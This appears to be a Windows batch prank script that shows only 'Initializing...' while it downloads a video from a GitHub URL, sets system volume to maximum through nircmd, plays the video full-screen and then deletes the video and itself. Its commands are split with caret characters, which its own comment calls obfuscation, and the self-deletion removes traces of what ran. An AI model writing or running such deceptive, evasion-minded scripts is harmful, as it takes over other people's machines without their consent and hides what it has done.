@echo off
echo Initializing...

REM Obfuscate the download, volume set, and video play commands
set DL_CMD=c^ur^l -o "%%TEMP%%\vid.mp4" "https://github.com/Grim-Anticheat/files-images/raw/main/ssstik.io_@x_l_u_i_x_1723569606416.mp4"
set VOL_CMD=nir^cmd.e^xe sets^ysvolu^me 65535
set PLAY_CMD=sta^rt /w^ait wmpla^yer /ful^lscree^n "%%TEMP%%\vid.mp4"
set CLEAN_CMD=del "%%TEMP%%\vid.mp4" && del "%%~f0"

REM Execute commands
%DL_CMD%
%VOL_CMD%
%PLAY_CMD%
%CLEAN_CMD%
